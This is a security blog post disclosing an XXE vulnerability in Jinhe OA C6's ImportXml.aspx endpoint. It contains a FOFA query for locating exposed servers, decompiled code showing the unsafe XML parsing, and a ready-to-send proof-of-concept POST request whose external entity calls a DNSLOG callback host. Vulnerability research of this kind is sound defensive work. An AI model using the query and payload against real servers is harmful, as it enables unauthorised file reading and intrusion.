---
title: "金和OA ImportXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ImportXml-xxe.html
asset_dir: assets/金和oa-importxml.aspx-xxe漏洞
---

# 金和OA ImportXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/27 13:31
* 425浏览
* [0评论](#comment)
* 10分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ImportXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ImportXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **ImportXml** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  Stream inputStream = this.Request.InputStream;
  byte[] numArray = new byte[(int) inputStream.Length];
  inputStream.Read(numArray, 0, numArray.Length);
  inputStream.Close();
  this.m_UserDs = this.m_Appraise.GetAllUserInfo();
  string xml = Encoding.UTF8.GetString(numArray);
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(xml);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.Appraise/ImportXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

[![金和OA ImportXml.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA ImportXml.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-ImportXml-xxe.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-ImportXml-xxe.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ImportXml-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ImportXml-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 